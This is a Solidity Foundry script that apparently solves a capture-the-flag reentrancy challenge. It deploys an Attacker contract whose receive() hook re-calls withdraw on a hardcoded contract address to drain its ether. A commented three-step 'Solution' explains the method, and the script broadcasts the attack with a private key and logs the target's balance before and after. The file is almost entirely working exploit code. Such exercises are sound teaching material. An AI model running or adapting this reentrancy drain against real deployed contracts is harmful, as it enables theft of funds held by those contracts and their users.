// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
//import "../src/Reentrancy.sol";

interface IReentrancy {
    function donate(address) external payable;
    function balanceOf(address) external view returns (uint256 balance);
    function withdraw(uint256 _amount) external;
}

contract Attacker {
    IReentrancy private reentrancy = IReentrancy(0xdFD1c8aB3BeFad6dCc46Cb6f9DE1Ef93bC4da47b);

    function withdraw(uint256 _amount) public {
        reentrancy.withdraw(_amount);
    }

    function withdrawFromContract(address _addr) external payable {
        (bool success, ) = _addr.call{value: address(this).balance}("");
        require(success, "call failed");
    }

    receive() external payable {
        uint256 amount = reentrancy.balanceOf(address(this));
        reentrancy.withdraw(amount);
    }
    
}

contract ReentrancyScript is Script {

    IReentrancy public reentrancy = IReentrancy(0xdFD1c8aB3BeFad6dCc46Cb6f9DE1Ef93bC4da47b);
    /**
     * Solution: Transactons on Ethereum are atomic. 
     * 1. Donate to Reentrancy so we can bypass validation.
     * 2. Call withraw in order to transfer ethers and hit receive().
     * 3. In receive() call reentrancy.withdraw again and withraw all the left ethers.
     */
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("1. Reentrancy balance", address(reentrancy).balance);
        Attacker attacker = new Attacker();
        reentrancy.donate{value: 1e15}(address(attacker));
        attacker.withdraw(1e15);
        console.log("2. Reentrancy balance after attack", address(reentrancy).balance);
        console.log(address(attacker).balance);
        vm.stopBroadcast();
    }
}
